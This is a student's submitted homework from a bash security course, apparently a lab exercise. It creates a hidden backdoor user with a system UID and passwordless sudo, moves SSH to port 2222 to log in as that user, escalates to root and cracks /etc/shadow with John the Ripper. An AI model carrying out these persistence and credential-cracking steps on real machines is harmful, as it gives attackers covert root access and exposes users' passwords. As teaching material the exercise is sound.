## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - sudo useradd sysd
    - Used useradd instead of adduser which would have created a home directory

2. Give your secret user a password: 
    - sudo passwd sysd
    - Had to look this one up as I don't remember going over this in class

3. Give your secret user a system UID < 1000:
    - sudo usermod -u 333 sysd

4. Give your secret user the same GID:
   - sudo groupmod -g 333 sysd

5. Give your secret user full `sudo` access without the need for a password:

- I used nano to check /etc/sudoers. I forgot what the line was to set no password needed for sudo.
   
- Copied the following command that was set to vagrant but changed the user to sysd,

- sysd ALL=(ALL:ALL) NOPASSWD:ALL

6. Test that `sudo` access works without your password:
   - I just used sudo nano /etc/passwd



**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

sudo nano /etc/ssh/sshd_config


**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

    - sudo service ssh restart or sudo systemctl restart ssh

2. Exit the `root` account:
    exit

3. SSH to the target machine using your `sysd` account and port `2222`:
    
    ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    
    sudo su 

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

   ssh sysd@192.168.6.105

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    sudo john /etc/shadow
    
    once that is complete you can run sudo john /etc/shadow --show to see cracked passwords

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

